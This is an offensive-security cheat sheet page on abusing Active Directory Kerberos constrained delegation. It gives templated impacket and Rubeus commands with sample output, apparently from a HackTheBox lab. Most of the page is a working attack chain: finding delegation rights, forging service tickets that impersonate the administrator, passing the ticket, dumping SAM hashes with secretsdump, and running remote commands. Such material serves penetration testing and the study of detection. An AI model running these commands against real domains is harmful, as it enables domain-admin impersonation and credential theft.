---
title: "AllowedToDelegate"
tags: ["Active Directory", "AllowedToDelegate", "AddAllowedtoAct", "AllowedToAct", "Pass-The-Ticket", "Silver Ticket", "Ticket Granting Ticket", "Windows"]
---

{{< filter_buttons >}}

### Forge a Ticket

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Pre-Check

```console {class="password"}
# Password
impacket-findDelegation '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ impacket-findDelegation 'intelligence.htb/svc_int$:Password123!' -dc-ip 10.129.31.133
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

AccountName  AccountType                          DelegationType                      DelegationRightsTo       SPN Exists 
-----------  -----------------------------------  ----------------------------------  -----------------------  ----------
svc_int$     ms-DS-Group-Managed-Service-Account  Constrained w/ Protocol Transition  WWW/dc.intelligence.htb  No 
```

```console {class="ntlm"}
# NTLM
impacket-findDelegation '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ impacket-findDelegation 'intelligence.htb/svc_int$' -hashes :655fefd062c233e273bb9f0566384474 -dc-ip 10.129.31.133
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

AccountName  AccountType                          DelegationType                      DelegationRightsTo       SPN Exists 
-----------  -----------------------------------  ----------------------------------  -----------------------  ----------
svc_int$     ms-DS-Group-Managed-Service-Account  Constrained w/ Protocol Transition  WWW/dc.intelligence.htb  No 
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ sudo ntpdate -s 'dc.intelligence.htb' && impacket-findDelegation 'intelligence.htb/svc_int$:Password123!' -k -dc-ip 10.129.31.133
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting machine hostname
[-] CCache file is not found. Skipping...
AccountName  AccountType                          DelegationType                      DelegationRightsTo       SPN Exists 
-----------  -----------------------------------  ----------------------------------  -----------------------  ----------
svc_int$     ms-DS-Group-Managed-Service-Account  Constrained w/ Protocol Transition  WWW/dc.intelligence.htb  No
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USER>' -hashes :<HASH> -k -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ sudo ntpdate -s 'dc.intelligence.htb' && impacket-findDelegation 'intelligence.htb/svc_int$' -hashes :655fefd062c233e273bb9f0566384474 -k -dc-ip 10.129.31.133
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting machine hostname
[-] CCache file is not found. Skipping...
AccountName  AccountType                          DelegationType                      DelegationRightsTo       SPN Exists 
-----------  -----------------------------------  ----------------------------------  -----------------------  ----------
svc_int$     ms-DS-Group-Managed-Service-Account  Constrained w/ Protocol Transition  WWW/dc.intelligence.htb  No 
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USER>' -k -no-pass -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ sudo ntpdate -s 'dc.intelligence.htb' && impacket-findDelegation 'intelligence.htb/svc_int$' -k -no-pass -dc-ip 10.129.31.133
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting machine hostname
AccountName  AccountType                          DelegationType                      DelegationRightsTo       SPN Exists 
-----------  -----------------------------------  ----------------------------------  -----------------------  ----------
svc_int$     ms-DS-Group-Managed-Service-Account  Constrained w/ Protocol Transition  WWW/dc.intelligence.htb  No
```

#### 2. Get a Service Ticket

```console {class="password"}
# Password
sudo ntpdate -s <DC> && impacket-getST '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -spn '<SPN>' -impersonate '<TARGET_USER>'
```

```console {class="sample-code"}
$ impacket-getST 'intelligence.htb/svc_int$:Password123!' -dc-ip 10.129.31.133 -spn 'WWW/dc.intelligence.htb' -impersonate 'administrator'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

```console {class="ntlm"}
# NTLM
sudo ntpdate -s <DC> && impacket-getST '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP> -spn '<SPN>' -impersonate '<TARGET_USER>'
```

```console {class="sample-code"}
$ impacket-getST 'intelligence.htb/svc_int$' -hashes :655fefd062c233e273bb9f0566384474 -dc-ip 10.129.31.133 -spn 'WWW/dc.intelligence.htb' -impersonate 'administrator'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
sudo ntpdate -s <DC> && impacket-getST '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-ip <DC_IP> -spn '<SPN>' -impersonate '<TARGET_USER>'
```

```console {class="sample-code"}
$ sudo ntpdate -s dc.intelligence.htb && impacket-getST 'intelligence.htb/svc_int$:Password123!' -k -dc-ip 10.129.31.133 -spn 'WWW/dc.intelligence.htb' -impersonate 'administrator'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
sudo ntpdate -s <DC> && impacket-getST '<DOMAIN>/<USER>' -hashes :<HASH> -k -dc-ip <DC_IP> -spn '<SPN>' -impersonate '<TARGET_USER>'
```

```console {class="sample-code"}
$ sudo ntpdate -s dc.intelligence.htb && impacket-getST 'intelligence.htb/svc_int$' -hashes :655fefd062c233e273bb9f0566384474 -k -dc-ip 10.129.31.133 -spn 'WWW/dc.intelligence.htb' -impersonate 'administrator'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
sudo ntpdate -s <DC> && impacket-getST '<DOMAIN>/<USER>' -k -no-pass -dc-ip <DC_IP> -spn '<SPN>' -impersonate '<TARGET_USER>'
```

```console {class="sample-code"}
$ sudo ntpdate -s dc.intelligence.htb && impacket-getST 'intelligence.htb/svc_int$' -k -no-pass -dc-ip 10.129.31.133 -spn 'WWW/dc.intelligence.htb' -impersonate 'administrator'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

#### 3. Secrets Dump

```console
# Pass-the-ticket
export KRB5CCNAME='<CCACHE>'
```

```console {class="sample-code"}
export KRB5CCNAME='administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache'
```

```console
# Ticket-based Kerberos
sudo ntpdate -s <DC> && impacket-secretsdump '<DOMAIN>/<TARGET_USER>@<TARGET>' -k -no-pass
```

```console {class="sample-code"}
$ sudo ntpdate -s dc.intelligence.htb && impacket-secretsdump 'intelligence.htb/administrator@dc.intelligence.htb' -k -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xcae14f646af6326ace0e1f5b8b4146df
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0054cc2f7ff3b56d9e47eb39c89b521f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
---[SNIP]---
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Add Delegation \[Optional\]

```console
# Import PowerView
. .\PowerView.ps1
```

```console
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount <USER>
```

#### 2. Check

```console
# Check msds-allowedtodelegateto
Get-NetUser -TrustedToAuth
```

{{< tab set1-2 tab1 active >}}Hash{{< /tab >}}{{< tab set1-2 tab2 >}}Kerberos{{< /tab >}}
{{< tabcontent set1-2 tab1 >}}

#### 3. Get NTLM Hash

```console
.\rubeus.exe hash /password:'<PASSWORD>' /user:'<USER>' /domain:<DOMAIN>
```

#### 4. Get a Service Ticket

```console
.\rubeus.exe s4u /user:'<USER>' /aes256:<HASH> /impersonateuser:'<TARGET_USER>' /domain:<DOMAIN> /msdsspn:'<SERVICE>/<TARGET_DOMAIN>' /altservice:<ALT_SERVICE> /nowrap /ptt
```

```console {class="sample-code"}
.\rubeus.exe s4u /user:'MS01$' /rc4:7ddf32e17a6ac5ce04a8ecbf782ca509 /impersonateuser:administrator /msdsspn:"cifs/dc01.client.example.com" /nowrap /ptt

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2 

[*] Action: S4U

[*] Using rc4_hmac hash: 7ddf32e17a6ac5ce04a8ecbf782ca509
[*] Building AS-REQ (w/ preauth) for: 'CLIENT.EXAMPLE.COM\MS01$'
[*] Using domain controller: 172.16.1.2:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFljCCBZKg ---[SNIP]--- hPUkUuQ09N

[*] Action: S4U

[*] Building S4U2self request for: 'MS01$@CLIENT.EXAMPLE.COM'
[*] Using domain controller: DC04.CLIENT.EXAMPLE.COM (172.16.1.2)
[*] Sending S4U2self request to 172.16.1.2:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'MS01$@CLIENT.EXAMPLE.COM'
[*] base64(ticket.kirbi):

      doIGGjCCBh ---[SNIP]--- cbBU1TMDIk

[*] Impersonating user 'administrator' to target SPN 'cifs/dc01.client.example.com'
[*] Building S4U2proxy request for service: 'cifs/dc01.client.example.com'
[*] Using domain controller: DC04.CLIENT.EXAMPLE.COM (172.16.1.2)
[*] Sending S4U2proxy request to domain controller 172.16.1.2:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc01.client.example.com':

      doIG9DCCBv ---[SNIP]--- 9yZS5jb20=
[+] Ticket successfully imported!
```

```console
# Or Create a sacrificial process
.\rubeus.exe s4u /user:'<USER>' /aes256:<HASH> /impersonateuser:'<TARGET_USER>' /domain:<DOMAIN> /msdsspn:'<SERVICE>/<TARGET_DOMAIN>' /altservice:<ALT_SERVICE> /nowrap /ptt /createnetonly /program:C:\Windows\System32\cmd.exe
```

{{< /tabcontent >}}
{{< tabcontent set1-2 tab2 >}}

#### 3. Request a Ticket

```console
.\rubeus.exe tgtdeleg /nowrap /ptt
```

#### 4. Get a Service Ticket

```console
.\rubeus.exe s4u /user:'<USER>' /ticket:'<BASE64_TICKET>' /impersonateuser:'<TARGET_USER>' /domain:<DOMAIN> /msdsspn:'<SERVICE>/<TARGET_DOMAIN>' /altservice:<ALT_SERVICE> /nowrap /ptt
```

```console
# Or Create a sacrificial process
.\rubeus.exe s4u /user:'<USER>' /ticket:'<BASE64_TICKET>' /impersonateuser:'<TARGET_USER>' /domain:<DOMAIN> /msdsspn:'<SERVICE>/<TARGET_DOMAIN>' /altservice:<ALT_SERVICE> /nowrap /ptt /createnetonly /program:C:\Windows\System32\cmd.exe
```

{{< /tabcontent >}}

#### 5. Remote

```console
# Check
klist
```

```console
# Create session
$session = new-pssession -computername <COMPUTER_NAME>
```

```console
# Execute cmd
Invoke-Command $session { <CMD> }
```

{{< /tabcontent >}}
